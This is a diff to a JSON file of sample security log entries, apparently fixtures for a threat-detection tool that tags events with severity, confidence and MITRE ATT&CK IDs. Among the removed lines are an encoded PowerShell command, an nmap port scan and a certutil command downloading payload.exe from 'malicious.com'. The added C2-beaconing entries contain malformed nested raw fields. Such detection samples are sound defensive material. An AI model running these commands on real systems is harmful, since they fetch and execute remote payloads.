@@ -5,70 +5,25 @@
     "event": "PowerShell Execution",
     "protocol": "PowerShell",
     "severity": "critical",
-    "confidence": 45,
+    "confidence": 85,
     "mitre_id": "T1059.001"
   },
   {
-    "raw": "nmap -sS -p 1-65535 192.168.1.1 port scan detected",
-    "ip": "192.168.1.1",
-    "event": "Port Scan",
+    "raw": "{'raw': 'Possible C2 beaconing: 192.168.1.100 sent 110 small packets to 192.168.1.1', 'event': 'C2 Beaconing', 'ip': '192.168.1.100', 'protocol': 'TCP/UDP', 'detail': 'Regular small packets suggest command and control traffic'}",
+    "ip": "192.168.1.100",
+    "event": "Unknown Event",
     "protocol": "Unknown",
     "severity": "medium",
-    "confidence": 55,
-    "mitre_id": "T1046"
-  },
-  {
-    "raw": "powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
-    "ip": null,
-    "event": "PowerShell Execution",
-    "protocol": "PowerShell",
-    "severity": "critical",
-    "confidence": 75,
-    "mitre_id": "T1059.001"
-  },
-  {
-    "raw": "User root attempted sudo access from 172.16.0.5 via SSH",
-    "ip": "172.16.0.5",
-    "event": "Privilege Escalation",
-    "protocol": "SSH",
-    "severity": "high",
-    "confidence": 65,
-    "mitre_id": "T1068"
-  },
-  {
-    "raw": "Failed login from 192.168.0.10 via SSH",
-    "ip": "192.168.0.10",
-    "event": "Login Failure",
-    "protocol": "SSH",
-    "severity": "high",
     "confidence": 45,
-    "mitre_id": "T1110"
+    "mitre_id": "T1071"
   },
   {
-    "raw": "User attempted privilege escalation via sudo -l",
-    "ip": null,
-    "event": "Privilege Escalation",
-    "protocol": "Unknown",
-    "severity": "medium",
-    "confidence": 35,
-    "mitre_id": "T1068"
-  },
-  {
-    "raw": "certutil -urlcache -split -f http://malicious.com/payload.exe",
-    "ip": null,
-    "event": "File Download Attempt",
-    "protocol": "HTTP",
-    "severity": "critical",
-    "confidence": 55,
-    "mitre_id": "T1105"
-  },
-  {
-    "raw": "base64 encoded payload detected in memory dump",
-    "ip": null,
+    "raw": "{'raw': 'Possible C2 beaconing: 10.0.0.50 sent 35 small packets to 192.168.1.1', 'event': 'C2 Beaconing', 'ip': '10.0.0.50', 'protocol': 'TCP/UDP', 'detail': 'Regular small packets suggest command and control traffic'}",
+    "ip": "10.0.0.50",
     "event": "Unknown Event",
     "protocol": "Unknown",
     "severity": "high",
-    "confidence": 60,
-    "mitre_id": "T1059.001"
+    "confidence": 75,
+    "mitre_id": "T1071"
   }
 ]
